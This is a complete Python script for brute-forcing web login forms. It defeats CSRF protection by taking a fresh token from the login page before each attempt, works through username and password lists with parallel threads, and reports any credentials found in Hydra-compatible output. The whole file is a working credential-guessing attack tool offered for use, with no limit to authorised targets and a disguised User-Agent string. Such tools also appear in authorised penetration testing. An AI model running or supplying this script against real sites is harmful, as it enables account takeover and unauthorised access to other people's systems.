#!/usr/bin/env python3
"""
CSRF-aware HTTP login brute force script.
Fetches a fresh CSRF token before each login attempt.
Output format is Hydra-compatible for seamless UI integration.
"""
import argparse
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from html.parser import HTMLParser
from urllib.parse import urlparse, urljoin

import requests

# ── HTML form parser ──────────────────────────────────────────────────────────

class FormParser(HTMLParser):
    """Extract hidden input fields from an HTML page."""
    def __init__(self):
        super().__init__()
        self.hidden_fields = {}

    def handle_starttag(self, tag, attrs):
        if tag != "input":
            return
        a = dict(attrs)
        if a.get("type", "").lower() == "hidden" and a.get("name"):
            self.hidden_fields[a["name"]] = a.get("value", "")


def extract_hidden_fields(html):
    p = FormParser()
    p.feed(html)
    return p.hidden_fields


# ── Core logic ────────────────────────────────────────────────────────────────

def try_login(target, login_path, user_field, pass_field, csrf_field,
              detect_mode, detect_str, username, password, port, wait_ms,
              extra_fields, verify_ssl):
    """
    Attempt a single login:
    1. GET login page → extract fresh CSRF + hidden fields
    2. POST credentials
    3. Check response for success/failure
    Returns (username, password, True/False)
    """
    parsed = urlparse(target)
    scheme = parsed.scheme or "https"
    host = parsed.hostname or target
    base = f"{scheme}://{host}"
    if port:
        base += f":{port}"

    login_url = base + login_path
    action_url = base + login_path  # POST to same URL unless form action differs

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (compatible; Recon/1.0)"

    try:
        # Step 1: GET login page for CSRF token
        r1 = session.get(login_url, timeout=10, verify=verify_ssl)
        hidden = extract_hidden_fields(r1.text)

        # Also check meta tag for CSRF
        meta_csrf = re.search(r'name="csrf"\s+content="([^"]+)"', r1.text)
        if meta_csrf and csrf_field and csrf_field not in hidden:
            hidden[csrf_field] = meta_csrf.group(1)

        # Find the actual form action
        form_match = re.search(
            r'<form[^>]*method=["\']?post["\']?[^>]*action=["\']?([^"\'>\s]+)',
            r1.text, re.IGNORECASE)
        if form_match:
            action_raw = form_match.group(1)
            if action_raw.startswith("http"):
                action_url = action_raw
            else:
                action_url = base + (action_raw if action_raw.startswith("/") else "/" + action_raw)

        # Step 2: Build POST data
        post_data = dict(hidden)  # all hidden fields (includes CSRF)
        post_data[user_field] = username
        post_data[pass_field] = password
        # Override with explicitly passed extra fields
        for k, v in extra_fields.items():
            if k != user_field and k != pass_field and k != csrf_field:
                post_data[k] = v

        if wait_ms > 0:
            time.sleep(wait_ms / 1000.0)

        # Step 3: POST login
        r2 = session.post(action_url, data=post_data, timeout=10,
                          allow_redirects=True, verify=verify_ssl)

        # Step 4: Check result
        full_response = r2.text
        # Also include the URL we ended up at (after redirects)
        final_url = r2.url

        if detect_mode == "F":
            # F= mode: failure string present → failed, absent → success
            if detect_str.lower() not in full_response.lower():
                return (username, password, True)
        else:
            # S= mode: success string present → success
            if detect_str.lower() in full_response.lower():
                return (username, password, True)

        return (username, password, False)

    except Exception as e:
        print(f"[WARNING] {username}:{password} - {e}", flush=True)
        return (username, password, False)


def main():
    parser = argparse.ArgumentParser(description="CSRF-aware HTTP brute force")
    parser.add_argument("--target", required=True)
    parser.add_argument("--login-url", required=True)
    parser.add_argument("--user-field", required=True)
    parser.add_argument("--pass-field", required=True)
    parser.add_argument("--csrf-field", default="")
    parser.add_argument("--detect-mode", default="F", choices=["F", "S"])
    parser.add_argument("--detect-str", default="incorrect")
    parser.add_argument("--userfile", default="")
    parser.add_argument("--users", default="admin")
    parser.add_argument("--passfile", default="")
    parser.add_argument("--passwords", default="")
    parser.add_argument("--extra-fields", default="", help="key=val,key=val")
    parser.add_argument("--port", default="")
    parser.add_argument("--tasks", type=int, default=1)
    parser.add_argument("--wait-ms", type=int, default=0)
    parser.add_argument("--no-verify-ssl", action="store_true")
    args = parser.parse_args()

    # Parse target
    parsed = urlparse(args.target if "://" in args.target else "https://" + args.target)
    host = parsed.hostname or args.target
    port = args.port or str(parsed.port or (443 if parsed.scheme == "https" else 80))
    proto = "http-post-form"
    verify_ssl = not args.no_verify_ssl

    # Build user list
    if args.userfile:
        with open(args.userfile, errors="ignore") as f:
            users = [l.strip() for l in f if l.strip()]
    else:
        users = [u.strip() for u in args.users.split(",") if u.strip()]

    # Build password list
    if args.passfile:
        with open(args.passfile, errors="ignore") as f:
            passwords = [l.strip() for l in f if l.strip()]
    else:
        passwords = [p.strip() for p in args.passwords.split(",") if p.strip()]

    if not users:
        users = ["admin"]
    if not passwords:
        print("[ERROR] Keine Passwörter angegeben", flush=True)
        sys.exit(1)

    # Parse extra fields
    extra = {}
    if args.extra_fields:
        for pair in args.extra_fields.split(","):
            if "=" in pair:
                k, v = pair.split("=", 1)
                extra[k.strip()] = v.strip()

    total = len(users) * len(passwords)
    found = []
    attempt = 0

    print(f"[INFO] CSRF Brute Force gestartet: {len(users)} User x {len(passwords)} Passwörter = {total} Versuche", flush=True)
    print(f"[INFO] Ziel: {args.target} | Login-URL: {args.login_url} | CSRF-Feld: {args.csrf_field or '(auto)'}", flush=True)
    print(f"[INFO] Tasks: {args.tasks} | Wait: {args.wait_ms} ms | Erkennung: {args.detect_mode}={args.detect_str}", flush=True)

    # Sequential or parallel execution
    if args.tasks <= 1:
        for user in users:
            for pw in passwords:
                attempt += 1
                print(f"[ATTEMPT] target {host} - login \"{user}\" - pass \"{pw}\" - {attempt} of {total} [child 0] (0/0)", flush=True)
                _, _, success = try_login(
                    args.target, args.login_url, args.user_field, args.pass_field,
                    args.csrf_field, args.detect_mode, args.detect_str,
                    user, pw, args.port, args.wait_ms, extra, verify_ssl)
                if success:
                    print(f"[{port}][{proto}] host: {host}   login: {user}   password: {pw}", flush=True)
                    found.append((user, pw))
    else:
        combos = [(u, p) for u in users for p in passwords]
        with ThreadPoolExecutor(max_workers=args.tasks) as pool:
            futures = {}
            for i, (user, pw) in enumerate(combos):
                f = pool.submit(
                    try_login, args.target, args.login_url, args.user_field,
                    args.pass_field, args.csrf_field, args.detect_mode,
                    args.detect_str, user, pw, args.port, args.wait_ms, extra, verify_ssl)
                futures[f] = (i + 1, user, pw)

            for f in as_completed(futures):
                idx, user, pw = futures[f]
                print(f"[ATTEMPT] target {host} - login \"{user}\" - pass \"{pw}\" - {idx} of {total} [child 0] (0/0)", flush=True)
                _, _, success = f.result()
                if success:
                    print(f"[{port}][{proto}] host: {host}   login: {user}   password: {pw}", flush=True)
                    found.append((user, pw))

    print(f"\n1 of 1 target successfully completed, {len(found)} valid passwords found", flush=True)
    sys.exit(0)


if __name__ == "__main__":
    main()
